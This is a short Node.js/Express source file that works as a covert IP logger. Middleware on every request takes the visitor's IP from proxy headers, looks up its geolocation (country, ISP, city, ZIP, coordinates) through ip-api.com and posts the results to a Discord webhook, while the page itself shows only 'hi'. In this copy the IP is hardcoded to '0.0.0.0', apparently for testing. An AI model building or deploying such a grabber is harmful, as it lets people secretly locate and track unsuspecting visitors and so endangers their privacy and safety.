const LoggerWebhook = require('./config.json').webhook



const axios = require('axios');
const express = require('express')
const app = express();
const {WebhookClient, EmbedBuilder} = require('discord.js')

async function getIP(address) {
    const req = await axios.get(`http://ip-api.com/json/${address}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,query`)
    return req.data
}

function getIpFromReq(req) {
    let ips = (
        req.headers['cf-connecting-ip'] ||
        req.headers['x-real-ip'] ||
        req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress || ''
    ).split(',');

    return ips[0].trim();
}

async function handleRequest(req, res, next) {
    let ip = getIpFromReq(req)
    // if(ip == "::1"){
    //     console.warn("IP is being accessed from Localhost, can't log IP.")
    //     next();
    //     return
    // }
    ip = '0.0.0.0'
    const IPData = await getIP(ip)
    const whc = new WebhookClient({url: LoggerWebhook})

    whc.send(`
> **[IP]:** ${IPData.query}
> **[Country]:** ${IPData.country}
> **[ISP]:** ${IPData.isp}
> **[City]:** ${IPData.city}, ${IPData.regionName}
> **[ZIP]:** ${IPData.zip}
> **[Latitude/Longitude]:** ${IPData.lat}, ${IPData.lon}
`)

    next()
}

app.use(handleRequest)

app.get('/', (req, res) => {
    res.send('hi')
})

app.listen(3000, () => {

})


// (async () => {
//     console.log(await getIP("184.190.174.69"));
// })()
